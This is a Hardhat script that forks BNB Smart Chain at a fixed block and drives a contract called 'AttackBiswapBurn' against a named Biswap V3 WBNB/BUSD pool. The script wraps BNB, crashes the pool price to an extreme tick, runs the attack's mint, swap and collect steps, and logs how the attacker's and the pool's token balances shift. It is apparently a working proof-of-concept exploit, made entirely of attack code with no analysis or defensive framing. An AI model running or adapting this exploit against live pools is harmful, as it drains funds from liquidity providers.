const hre = require("hardhat");
const { ethers } = hre;

const POOL = "0xc83f96f87f586a858a14c89e16434460bac0b643";
const WBNB = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
const BUSD = "0xe9e7cea3dedca5984780bafc599bd69add087d56";

const FORK_BLOCK = 135526419;
const CRASH_X = 11_283n * 10n ** 18n;
const DESIRE_X = 11_283_277_957_284_066_035_619n;

async function main() {
  const rpc = process.env.BSC_RPC_URL;
  if (!rpc) throw new Error("BSC_RPC_URL is not set");

  await hre.network.provider.send("hardhat_reset", [
    { forking: { jsonRpcUrl: rpc, blockNumber: FORK_BLOCK } },
  ]);

  const pool = await ethers.getContractAt("IBiswapPoolV3", POOL);
  const wbnb = await ethers.getContractAt("MockERC20", WBNB);
  const busd = await ethers.getContractAt("MockERC20", BUSD);

  console.log("pool state before:", await pool.state());

  const Attacker = await ethers.getContractFactory("AttackBiswapBurn");
  const attacker = await Attacker.deploy(
    POOL,
    WBNB,
    BUSD,
    -400050,
    -400000,
    4_847_000_000n,
    484_700_000n,
    10n,
    DESIRE_X,
    800_000
  );
  await attacker.waitForDeployment();
  const attackerAddress = await attacker.getAddress();
  console.log("attacker:", attackerAddress);

  const [deployer] = await ethers.getSigners();
  await hre.network.provider.send("hardhat_setBalance", [
    await deployer.getAddress(),
    "0x" + (12_000n * 10n ** 18n).toString(16),
  ]);

  const value = 11_300n * 10n ** 18n;
  await (await attacker.wrap({ value })).wait();
  console.log("after wrap: WBNB", (await wbnb.balanceOf(attackerAddress)).toString());

  await (await attacker.crash(CRASH_X, -400_001)).wait();
  console.log("after crash: pool state:", await pool.state());
  console.log("after crash: attacker WBNB", (await wbnb.balanceOf(attackerAddress)).toString());
  console.log("after crash: attacker BUSD", (await busd.balanceOf(attackerAddress)).toString());
  console.log("after crash: pool WBNB", (await wbnb.balanceOf(POOL)).toString());
  console.log("after crash: pool BUSD", (await busd.balanceOf(POOL)).toString());
  console.log("crashPaidX:", (await attacker.crashPaidX()).toString());
  console.log("crashReceivedY:", (await attacker.crashReceivedY()).toString());

  await (await attacker.attack()).wait();
  console.log("pool state after:", await pool.state());
  console.log("mintPaidY:", (await attacker.mintPaidY()).toString());
  console.log("swapPaidY:", (await attacker.swapPaidY()).toString());
  console.log("swapReceivedX:", (await attacker.swapReceivedX()).toString());
  console.log("collectedY:", (await attacker.collectedY()).toString());
  console.log("attacker WBNB:", (await wbnb.balanceOf(attackerAddress)).toString());
  console.log("attacker BUSD:", (await busd.balanceOf(attackerAddress)).toString());
  console.log("pool WBNB:", (await wbnb.balanceOf(POOL)).toString());
  console.log("pool BUSD:", (await busd.balanceOf(POOL)).toString());
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
